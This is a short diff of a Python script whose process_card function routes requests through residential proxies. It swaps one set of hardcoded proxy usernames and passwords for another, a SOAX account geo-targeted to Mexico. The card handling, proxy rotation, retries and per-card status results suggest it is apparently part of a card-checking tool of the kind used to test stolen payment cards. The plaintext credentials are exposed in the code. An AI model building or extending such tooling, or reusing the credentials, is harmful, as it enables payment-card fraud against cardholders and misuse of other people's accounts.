@@ -61,23 +61,22 @@ async def process_card(card: str) -> str:
     while retry_count < max_retries:
         try:
             #============[Funcions Need]============#
-            c =  requests.Session()
-            usuariop = "RNET14947_Quituk-zone-resi-asn-AS10279"
-            contraseña = "Saiper123"
-            host = "us.resiproxies.net"
-            puerto = "16666"
+            proxy_user = "package-310562-country-mx-city-merida-isp-telmex+dsl"
+            proxy_pass = "2P5V1zr0HaKb2zBs"
+            proxy_host = "proxy.soax.com"
+            proxy_port = 5000
 
-            proxy_url = f"http://{usuariop}:{contraseña}@{host}:{puerto}"
+            # Crear la URL del proxy
+            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
 
+            # Crear sesión
+            c = requests.Session()
+
+            # Configurar proxy en la sesión
             c.proxies = {
                 "http": proxy_url,
-                "https": proxy_url
+                "https": proxy_url,
             }
-
-            
-            proxy_url = 'http://proxy.soax.com:5000'
-            proxy_user = 'package-265377-country-mx'
-            proxy_pass = '589UEf1c4AXLjJ2M'
 
             
             
@@ -289,3 +288,4 @@ async def process_card(card: str) -> str:
     else:
 
         return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
+
